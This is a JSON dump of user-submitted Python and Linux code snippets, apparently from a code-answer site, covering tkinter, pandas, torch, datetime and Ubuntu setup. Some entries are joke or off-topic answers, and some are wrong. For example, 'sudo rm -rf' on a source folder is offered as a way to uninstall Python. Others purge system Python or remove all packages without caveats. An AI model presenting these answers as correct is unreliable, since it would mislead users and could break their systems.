    "title": " tkinter make window not resizable",
    "description": "root.resizable(False, False) \nroot.resizable(False, False)\nwin.wm_minsize(180, 120) #Change the two numbers to the minimum window width and minimum window height.\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4541,
    "keyword": null,
    "link": null,
    "title": " tkinter make window scrollable",
    "description": "from tkinter import * class ScrollBar:     def __init__(self):         root = Tk()         h = Scrollbar(root, orient = 'horizontal')         h.pack(side = BOTTOM, fill = X)         v = Scrollbar(root)         v.pack(side = RIGHT, fill = Y)         t = Text(root, width = 15, height = 15, wrap = NONE,                  xscrollcommand = h.set,                  yscrollcommand = v.set)         for i in range(20):             t.insert(END,\"this is some text\\n\")         t.pack(side=TOP, fill=X)         h.config(command=t.xview)         v.config(command=t.yview)         root.mainloop() s = ScrollBar()\nfrom Tkinter import *  root = Tk() scrollbar = Scrollbar(root) scrollbar.pack( side = RIGHT, fill = Y )  mylist = Listbox(root, yscrollcommand = scrollbar.set ) for line in range(100):    mylist.insert(END, \"This is line number \" + str(line))  mylist.pack( side = LEFT, fill = BOTH ) scrollbar.config( command = mylist.yview )  mainloop()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4542,
    "keyword": null,
    "link": null,
    "title": " tkinter max size",
    "description": "from tkinter import * root = Tk() root.maxsize(height, width) root.minsize(height, width) #(69, 420) root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4543,
    "keyword": null,
    "link": null,
    "title": " tkinter maximum window size",
    "description": "from tkinter import * root = Tk() root.maxsize(height, width) root.minsize(height, width) #(69, 420) root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4544,
    "keyword": null,
    "link": null,
    "title": " tkinter minsize",
    "description": "from tkinter import * root = Tk() root.maxsize(height, width) root.minsize(height, width) #(69, 420) root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4545,
    "keyword": null,
    "link": null,
    "title": " tkinter radio button",
    "description": "from tkinter import *  root = Tk()  i = IntVar() #Basically Links Any Radiobutton With The Variable=i. r1 = Radiobutton(root, text=\"option 1\", value=1, variable=i) r2 = Radiobutton(root, text=\"option 2\", value=2, variable=i) # \"\"\" If both values where equal, when one of the buttons are pressed all buttons would be pressed. If a button is pressed its value is true, or 1. If you want to acess the data from the radiobuttons, use a if statment like \"\"\" if (i.get() ==1):        print(\"you picked option1\") else:         print(\"you picked option2\")          # :)  r1.pack() r2.pack()  root.mainloop()\nfrom Tkinter import *  master = Tk()  v = IntVar()  Radiobutton(master, text=\"One\", variable=v, value=1).pack(anchor=W) Radiobutton(master, text=\"Two\", variable=v, value=2).pack(anchor=W)  mainloop()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4546,
    "keyword": null,
    "link": null,
    "title": " tkinter radiobutton",
    "description": "from tkinter import *  root = Tk()  i = IntVar() #Basically Links Any Radiobutton With The Variable=i. r1 = Radiobutton(root, text=\"option 1\", value=1, variable=i) r2 = Radiobutton(root, text=\"option 2\", value=2, variable=i) # \"\"\" If both values where equal, when one of the buttons are pressed all buttons would be pressed. If a button is pressed its value is true, or 1. If you want to acess the data from the radiobuttons, use a if statment like \"\"\" if (i.get() ==1):        print(\"you picked option1\") else:         print(\"you picked option2\")          # :)  r1.pack() r2.pack()  root.mainloop()\nfrom Tkinter import *  master = Tk()  v = IntVar()  Radiobutton(master, text=\"One\", variable=v, value=1).pack(anchor=W) Radiobutton(master, text=\"Two\", variable=v, value=2).pack(anchor=W)  mainloop()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4547,
    "keyword": null,
    "link": null,
    "title": " tkinter taille de l'ecran",
    "description": "import tkinter as tk  root = tk.Tk()  screen_width = root.winfo_screenwidth() screen_height = root.winfo_screenheight()\n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4548,
    "keyword": null,
    "link": null,
    "title": " tkinter text in canvas",
    "description": "self.canvas = Canvas(root, width=800, height=650, bg = '#afeeee') self.canvas.create_text(100,10,fill=\"darkblue\",font=\"Times 20 italic bold\",                         text=\"Click the bubbles that are multiples of two.\")\n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4549,
    "keyword": null,
    "link": null,
    "title": " tkinter window title",
    "description": " windowName.title('Window Title')  #Example import tkinter window = tkinter.Tk() window.title('My Title')\nfrom tkinter import * window = Tk()  # Create instance  window.title(\"This is the window title!!!\")  # Add a title\nfrom tkinter import Tk, Button, Frame, Entry, END  class ABC(Frame):     def __init__(self,parent=None):         Frame.__init__(self,parent)         self.parent = parent         self.pack()         ABC.make_widgets(self)      def make_widgets(self):         self.root = Tk()         self.root.title(\"Simple Prog\")\n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4550,
    "keyword": null,
    "link": null,
    "title": " to csv without index",
    "description": "df.to_csv('your.csv', index=False) \n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4551,
    "keyword": null,
    "link": null,
    "title": " to dataframe pandas",
    "description": "df = pd.DataFrame(my_series) \n>>> s = pd.Series([\"a\", \"b\", \"c\"], ...               name=\"vals\") >>> s.to_frame()   vals 0    a 1    b 2    c \ndf = pd.DataFrame([s]) print (df)          product_id_y  count 6159402       1159730      1\npd.DataFrame({'email':sf.index, 'list':sf.values})\ndf = my_series.to_frame() \n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4552,
    "keyword": null,
    "link": null,
    "title": " to extract out only year month from a date column in pandas",
    "description": "df['date'] = pd.to_datetime(df['date'],format='%Y%m%d') df['year'] = pd.DatetimeIndex(df['date']).year df['month'] = pd.DatetimeIndex(df['date']).month\ndf['month_year'] = df['date_column'].dt.to_period('M') \n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4553,
    "keyword": null,
    "link": null,
    "title": " today date in python",
    "description": "from datetime import date  today = date.today() print(\"Today's date:\", today)\n# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> 2020-10-03 15:29:54.822751  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t %z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\nfrom datetime import date today = date.today().strftime(\"%d-%m-%Y\")\n from datetime import datetime  # Current date time in local system print(datetime.now()) print(datetime.date(datetime.now())) ##For Date \ntoday = datetime.today().strftime(\"%Y-%m-%d %H:%M:%S\")\nfrom datetime import date  today = date.today() print(\"Today's date:\", today) \n",
    "reg_date": "2021-10-12T11:35:20.000Z"
  },
  {
    "id": 4554,
    "keyword": null,
    "link": null,
    "title": " today date python",
    "description": "from datetime import datetime, timedelta  yesterday = datetime.today() - timedelta(days = 1 )\nfrom datetime import date  today = date.today() print(\"Today's date:\", today)\n# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> 2020-10-03 15:29:54.822751  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t %z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\nfrom datetime import date today = date.today().strftime(\"%d-%m-%Y\")\nfrom datetime import date //today is an object so you can get the day, month and year by //treating it as an object. eg: today.day, today.month, today.year today = date.today() print(\"Today's date:\", today)\ntoday = datetime.today().strftime(\"%Y-%m-%d %H:%M:%S\")\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4555,
    "keyword": null,
    "link": null,
    "title": " token obtain pair check email",
    "description": "#by default, TokenObtainPairView takes 'username' and 'password' as user #credentials. This snippet makes them 'email' and 'password' #https://stackoverflow.com/questions/54157056/how-can-i-use-email-in-django-rest-framework-simplejwt-instead-of-username from rest_framework_simplejwt.views import TokenObtainPairView from rest_framework_simplejwt.serializers import (     TokenObtainPairSerializer, User )  class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):     username_field = User.EMAIL_FIELD   class EmailTokenObtainPairView(TokenObtainPairView):     serializer_class = CustomTokenObtainPairSerializer  \n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4556,
    "keyword": null,
    "link": null,
    "title": " top.gg python",
    "description": "from discord.ext import commands  import dbl   class TopGG(commands.Cog):     \"\"\"     This example uses dblpy's webhook system.     In order to run the webhook, at least webhook_port must be specified (number between 1024 and 49151).     \"\"\"      def __init__(self, bot):         self.bot = bot         self.token = 'dbl_token'  # set this to your DBL token         self.dblpy = dbl.DBLClient(self.bot, self.token, webhook_path='/dblwebhook', webhook_auth='password', webhook_port=5000)      @commands.Cog.listener()     async def on_dbl_vote(self, data):         \"\"\"An event that is called whenever someone votes for the bot on top.gg.\"\"\"         print(\"Received an upvote:\", \"\\n\", data, sep=\"\")      @commands.Cog.listener()     async def on_dbl_test(self, data):         \"\"\"An event that is called whenever someone tests the webhook system for your bot on top.gg.\"\"\"         print(\"Received a test upvote:\", \"\\n\", data, sep=\"\")   def setup(bot):     bot.add_cog(TopGG(bot))\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4557,
    "keyword": null,
    "link": null,
    "title": " torch concat matrix",
    "description": "third_tensor = torch.cat((first_tensor, second_tensor), 0) # keep column width append in rows  third_tensor = torch.cat((first_tensor, second_tensor), 1) # keep row height and append in columns\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4558,
    "keyword": null,
    "link": null,
    "title": " torch device",
    "description": "device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4559,
    "keyword": null,
    "link": null,
    "title": " torch mse loss",
    "description": "loss = nn.MSELoss() \n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4560,
    "keyword": null,
    "link": null,
    "title": " torch save state dict",
    "description": "torch.save(model.state_dict(), PATH) model.load_state_dict(torch.load(PATH))\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4561,
    "keyword": null,
    "link": null,
    "title": " tqdm for jupyter notebook",
    "description": "from tqdm.notebook import tqdm\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4562,
    "keyword": null,
    "link": null,
    "title": " tqdm parallel",
    "description": "from pqdm.processes import pqdm # If you want threads instead: # from pqdm.threads import pqdm  args = [1, 2, 3, 4, 5] # args = range(1,6) would also work  def square(a):     return a*a  result = pqdm(args, square, n_jobs=2) \n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4563,
    "keyword": null,
    "link": null,
    "title": " traceback python",
    "description": "import traceback  try:     raise TypeError(\"Oups!\") except Exception, err:     try:         raise TypeError(\"Again !?!\")     except:         pass      traceback.print_exc()\nimport traceback  try: #Error prone code \tx=1/0 except Exception as e:   \tprint(e) \ttraceback.print_exc()\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4564,
    "keyword": null,
    "link": null,
    "title": " track phone number location using python",
    "description": "# install package: pip install phonenumbers  # code: import phonenumbers from phonenumbers import geocoder from phonenumbers import carrier  number = '+XXXXXXXXXX' ch_number = phonenumbers.parse(number, \"CH\") print(geocoder.description_for_number(ch_number, \"en\")) service_provider = phonenumbers.parse(number, \"RO\") print(carrier.name_for_number(service_provider, \"en\"))\n",
    "reg_date": "2021-10-12T11:35:21.000Z"
  },
  {
    "id": 4565,
    "keyword": null,
    "link": null,
    "title": " tracking mouse position tkinter python",
    "description": "import Tkinter as tk root = tk.Tk()  def motion(event):     x, y = event.x, event.y     print('{}, {}'.format(x, y))  root.bind('<Motion>', motion) root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4566,
    "keyword": null,
    "link": null,
    "title": " traduttore",
    "description": "upvote if you feel terrible\n# pip install googletrans from googletrans import Translator translator = Translator() print(translator.translate(\"Traduisez des langues avec python.\").text)\nUse Reverso Context to get the in-context right words and sentence\nnot cheating on spanish hell yea\nlisten to renai circulation\nAre you cheating on your Spanish homework? GET BACK TO PROGRAMMING!\nGo to Google Translate!\ntraduire du fran&ccedil;ais vers l'anglais\ni know that you are translating\nidad\n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4567,
    "keyword": null,
    "link": null,
    "title": " train test split without shuffle",
    "description": "from sklearn.model_selection import train_test_split train_test_split(X, y, test_size=0.2, shuffle=False) \n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4568,
    "keyword": null,
    "link": null,
    "title": " transform size of picture pygame",
    "description": "import pygame picture = pygame.image.load(filename) picture = pygame.transform.scale(picture, (1280, 720)) \n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4569,
    "keyword": null,
    "link": null,
    "title": " translate english to japanese",
    "description": "print(\"Are you... translating words from anime??? Go Code RIGHT NOW!\")\nim not\n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4570,
    "keyword": null,
    "link": null,
    "title": " translate sentences in python",
    "description": "# First install translate with pip in cmd pip install translate  # Code from translate import Translator translator= Translator(from_lang=\"german\",to_lang=\"spanish\") translation = translator.translate(\"Guten Morgen\") print(translation)\nWelcome to Python programming\n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4571,
    "keyword": null,
    "link": null,
    "title": " transpose a matrix using list comprehension",
    "description": "MT = [[0,0,0], [0,0,0], [0,0,0]] for ir in range(3):     for ic in range(3):         MT[ic][ir] = M[ir][ic] \n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4572,
    "keyword": null,
    "link": null,
    "title": " transpose of dataframe",
    "description": "result = df.transpose()     \n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4573,
    "keyword": null,
    "link": null,
    "title": " tresure island python",
    "description": "print(\"Welcome to Treasure Island.\") print(\"Your mission is to find the treasure.\") choice1 = input('You\\'re at a cross road. Where do you want to go? Type \"left\" or \"right\" \\n').lower() if choice1 == \"left\":   choice2 = input('You\\'ve come to a lake. There is an island in the middle of the lake. Type \"wait\" to wait for a boat. Type \"swim\" to swim across. \\n').lower()   if choice2 == \"wait\":     choice3 = input(\"You arrive at the island unharmed. There is a house with 3 doors. One red, one yellow and one blue. Which colour do you choose? \\n\").lower()     if choice3 == \"red\":       print(\"It's a room full of fire. Game Over.\")     elif choice3 == \"yellow\":       print(\"You found the treasure! You Win!\")     elif choice3 == \"blue\":       print(\"You enter a room of beasts. Game Over.\")     else:       print(\"You chose a door that doesn't exist. Game Over.\")   else:     print(\"You get attacked by an angry trout. Game Over.\") else:   print(\"You fell into a hole. Game Over.\")\n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4574,
    "keyword": null,
    "link": null,
    "title": " trial error method python",
    "description": "def trial_error_method(P:int):     result = 5*P+2     if result == 17:         return True     else:         return False def trial_error_method2(M:int):     result = 3*M-14     if result == 4:         return True     else:         return False      num = 1 found = False while found == False:     found = trial_error_method(num)     if found == True:         break           num += 1 num2 = 1 while True:     found2 = trial_error_method2(num2)     if found2 == True:         break     num2 += 1 print(num) print(num2)\n",
    "reg_date": "2021-10-12T11:35:22.000Z"
  },
  {
    "id": 4575,
    "keyword": null,
    "link": null,
    "title": " trim text python",
    "description": "MyString = \" Hello.   \" MyString.strip()  #output >>>>> 'Hello.'\n>>> ' Hello '.strip() 'Hello' \nstring ='   abc   '  # After removing leading whitespace print(string.lstrip()); # Output: 'abc   '  # After removing trailing whitespace print(string.rstrip()); # Output: '   abc'  # After removing all whitespace print(string.strip()); # Output: 'abc'\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4576,
    "keyword": null,
    "link": null,
    "title": " truncate add weird symbols in python",
    "description": "To solve the above error Try This:   with open('file.txt','r+') as f:     # Try to seek the position to 0     f.seek(0)     f.truncate(0) for me it solved the problem  OR import fileinput  for line in fileinput.input('file.txt', inplace=1):   pass\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4577,
    "keyword": null,
    "link": null,
    "title": " truncate templat tag django",
    "description": "{{ value|truncatechars:9 }}\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4578,
    "keyword": null,
    "link": null,
    "title": " tuple with one element python",
    "description": "tuple_or_not = (\"python\") print(type(tuptuple_or_not)) #output <class 'str'>  ################################### tuple_or_not = (\"python\",) print(type(tuple_or_not)) #output <class 'tuple'>\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4579,
    "keyword": null,
    "link": null,
    "title": " turn multiindex into columns#",
    "description": "df.reset_index(inplace=True)\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4580,
    "keyword": null,
    "link": null,
    "title": " turn of axis",
    "description": "ax.axis('off') plt.axis('off')\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4581,
    "keyword": null,
    "link": null,
    "title": " turn off axes matplotlib",
    "description": "plt.axis('off')\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4582,
    "keyword": null,
    "link": null,
    "title": " turn off warnings",
    "description": "import warnings warnings.filterwarnings(\"ignore\")\n",
    "reg_date": "2021-10-12T11:35:23.000Z"
  },
  {
    "id": 4583,
    "keyword": null,
    "link": null,
    "title": " turn pandas entries into strings",
    "description": "frame[\"DataFrame Column\"]= frame[\"DataFrame Column\"].map(str) frame[\"DataFrame Column\"]= frame[\"DataFrame Column\"].apply(str) frame[\"DataFrame Column\"]= frame[\"DataFrame Column\"].astype(str) frame[\"DataFrame Column\"]= frame[\"DataFrame Column\"].values.astype(str)\n",
    "reg_date": "2021-10-12T11:35:25.000Z"
  },
  {
    "id": 4584,
    "keyword": null,
    "link": null,
    "title": " turning an integer into a list python",
    "description": "res = [int(x) for x in str(num)] \ntarget_list = len(list(str(number)))\n",
    "reg_date": "2021-10-12T11:35:25.000Z"
  },
  {
    "id": 4585,
    "keyword": null,
    "link": null,
    "title": " turtle circle() python",
    "description": "import turtle t = turtle.Turtle() t.color(color) # choose a color t.begin_fill() # if you want it to be filled with color later t.circle(10) # the function \"circle\" and the radious. t.end_fill() # completing the filling of the circle.  # try to do it and see if it works. it worked for me.\n",
    "reg_date": "2021-10-12T11:35:25.000Z"
  },
  {
    "id": 4586,
    "keyword": null,
    "link": null,
    "title": " tweepy Async Streaming",
    "description": "server = server_id : int Tchan = server.get_channel(channel_id : int)  import tweepy api_key = \"string\" #also called consumer key api_key_secret = \"string\" #also called consumer key secret access_token = \"string-8z95tnY8Fid91sFUxACJeMQWv4RsI6D\" access_token_secret = \"string\" authenticator = tweepy.OAuthHandler(api_key, api_key_secret) authenticator.set_access_token(access_token, access_token_secret) api = tweepy.API(authenticator, wait_on_rate_limit=True)  #Requires Tweepy 4.0.0-alpha from tweepy.asynchronous.streaming import AsyncStream  class AsyncStream(tweepy.asynchronous.AsyncStream): \tasync def on_status(self, status): \t\t#make sure this is a real tweet \t\tif hasattr(status, 'retweeted_status'): \t\t\treturn False \t\telif status.in_reply_to_status_id != None: \t\t\treturn False \t\telif status.in_reply_to_screen_name != None: \t\t\treturn False \t\telif status.in_reply_to_user_id != None: \t\t\treturn False \t\telse:           \t#sends the tweet's content to the channel \t\t\tawait Tchan.send(status.text)  myStream = AsyncStream(api_key, api_key_secret, access_token, access_token_secret) myStream.filter(track=[\"python\"]) #start the stream\n",
    "reg_date": "2021-10-12T11:35:25.000Z"
  },
  {
    "id": 4587,
    "keyword": null,
    "link": null,
    "title": " two elements at a time in list comprehension",
    "description": ">>> f1 = lambda x: x >>> f2 = lambda x: 10*x  >>> [f(x) for x in range(5) for f in (f1,f2)] [0, 0, 1, 10, 2, 20, 3, 30, 4, 40] \n",
    "reg_date": "2021-10-12T11:35:26.000Z"
  },
  {
    "id": 4588,
    "keyword": null,
    "link": null,
    "title": " txt file duplicate line remover python",
    "description": "lines_seen = set() # holds lines already seen  with open(\"file.txt\", \"r+\") as f:     d = f.readlines()     f.seek(0)     for i in d:         if i not in lines_seen:             f.write(i)             lines_seen.add(i)     f.truncate()\n",
    "reg_date": "2021-10-12T11:35:26.000Z"
  },
  {
    "id": 4589,
    "keyword": null,
    "link": null,
    "title": " txt to list python",
    "description": "# name.txt david mary john   with open('names.txt', 'r') as f:     myNames = [line.strip() for line in f]      # Result  ['david','mary','john']\nwith open('file1.txt','r') as f: \tlistl=[] \tfor line in f: \t\tstrip_lines=line.strip() \t\tlistli=strip_lines.split() \t\tprint(listli) \t\tm=listl.append(listli) \tprint(listl)\nwith open('names.txt', 'r') as f:     myNames = [line.strip() for line in f] \n",
    "reg_date": "2021-10-12T11:35:26.000Z"
  },
  {
    "id": 4590,
    "keyword": null,
    "link": null,
    "title": " type object 'datetime.datetime' has no attribute 'timedelta'",
    "description": "# Use either import datetime datetime.datetime.timedelta() # or from datetime import datetime datetime.timedelta() # But do not use (as you currently are): from datetime import datetime datetime.datetime.timedelta()\n",
    "reg_date": "2021-10-12T11:35:26.000Z"
  },
  {
    "id": 4591,
    "keyword": null,
    "link": null,
    "title": " typeerror 'in string ' requires string as left operand not re.match",
    "description": "print(\"help me\")\n",
    "reg_date": "2021-10-12T11:35:26.000Z"
  },
  {
    "id": 4592,
    "keyword": null,
    "link": null,
    "title": " ubuntu cant find python installation",
    "description": "whereis python\n",
    "reg_date": "2021-10-12T11:35:27.000Z"
  },
  {
    "id": 4593,
    "keyword": null,
    "link": null,
    "title": " ubuntu install pip for python 3.8",
    "description": "$ sudo apt update $ sudo apt install python3-pip \n",
    "reg_date": "2021-10-12T11:35:27.000Z"
  },
  {
    "id": 4594,
    "keyword": null,
    "link": null,
    "title": " ubuntu install python",
    "description": "# first do: sudo apt-get update # after do: sudo apt-get install python3.6 # then it should be installed\nsudo apt-get install python3.7\nsudo apt update sudo apt install software-properties-common sudo add-apt-repository ppa:deadsnakes/ppa sudo apt update sudo apt install python3.8\nsudo apt install python3.8\nwget https://www.python.org/ftp/python/3.7.5/Python-3.7.5.tgz\ncd /tmp curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py\n",
    "reg_date": "2021-10-12T11:35:27.000Z"
  },
  {
    "id": 4595,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove python 2.7",
    "description": "# Remove python2 sudo apt purge -y python2.7-minimal  # You already have Python3 but  # don't care about the version  sudo ln -s /usr/bin/python3 /usr/bin/python  # Same for pip sudo apt install -y python3-pip sudo ln -s /usr/bin/pip3 /usr/bin/pip  # Confirm the new version of Python: 3 python --version\nwhereis python which python\n",
    "reg_date": "2021-10-12T11:35:27.000Z"
  },
  {
    "id": 4596,
    "keyword": null,
    "link": null,
    "title": " unable to execute 'x86 64-linux-gnu-gcc': No such file or directoryunable to execute 'x86 64-linux-gnu-gcc': No such file or directory",
    "description": "sudo apt-get install build-essential autoconf libtool pkg-config python-opengl python-pil python-pyrex python-pyside.qtopengl idle-python2.7 qt4-dev-tools qt4-designer libqtgui4 libqtcore4 libqt4-xml libqt4-test libqt4-script libqt4-network libqt4-dbus python-qt4 python-qt4-gl libgle3 python-dev libssl-dev  sudo easy_install greenlet  sudo easy_install gevent \n",
    "reg_date": "2021-10-12T11:35:27.000Z"
  },
  {
    "id": 4597,
    "keyword": null,
    "link": null,
    "title": " unimport library python",
    "description": "# Import your library import time  # Remove your library (change as needed) # You'll lose access to it # Python will still keep a copy around in the cache though del time # If you want to reload it (> Python 3.4): import importlib, time importlib.reload(time)\n",
    "reg_date": "2021-10-12T11:35:28.000Z"
  },
  {
    "id": 4598,
    "keyword": null,
    "link": null,
    "title": " uninstall all packages python",
    "description": "pip3 freeze | xargs pip3 uninstall -y\npip uninstall -y -r <(pip freeze) \n#Write all modules to a txt file pip freeze > requirements.txt  #Now to remove one by one: pip uninstall -r requirements.txt  #If we want to remove all at once then: pip uninstall -r requirements.txt -y\npip list --format=freeze | %{$_.split('==')[0]} | %{If(($_ -eq \"pip\") -or ($_ -eq \"setuptools\") -or ($_ -eq \"wheel\")) {} Else {$_}} | %{pip uninstall $_ -y}\npip freeze | xargs pip uninstall -y\npip freeze | xargs pip uninstall -y \n",
    "reg_date": "2021-10-12T11:35:28.000Z"
  },
  {
    "id": 4599,
    "keyword": null,
    "link": null,
    "title": " uninstall python3.8 ubuntu",
    "description": "sudo rm -rf Python-3.8.0\n",
    "reg_date": "2021-10-12T11:35:28.000Z"
  },
  {
    "id": 4600,
    "keyword": null,
    "link": null,
    "title": " union df pandas",
    "description": "pd.concat([df1, df2]) \nIn [6]: result = pd.concat(frames, keys=['x', 'y', 'z']) \n",
    "reg_date": "2021-10-12T11:35:28.000Z"
  },
  {
    "id": 4601,
    "keyword": null,
    "link": null,
    "title": " unique words from pandas",
    "description": "results = set() df['text'].str.lower().str.split().apply(results.update)\n",
    "reg_date": "2021-10-12T11:35:28.000Z"
  },
  {
    "id": 4602,
    "keyword": null,
    "link": null,
    "title": " unix to date python",
    "description": ">>> from datetime import datetime >>> ts = int(\"1284101485\")  # if you encounter a \"year is out of range\" error the timestamp # may be in milliseconds, try `ts /= 1000` in that case >>> print(datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')) #'%Y' will be replaced by the year '%m' by the month '%d; by the day and so on  #You move these how you want in the string, other characters will be ignored! ... '2010-09-10 06:51:25'\n",
    "reg_date": "2021-10-12T11:35:28.000Z"
  },
  {
    "id": 4603,
    "keyword": null,
    "link": null,
    "title": " unlimited arguments python",
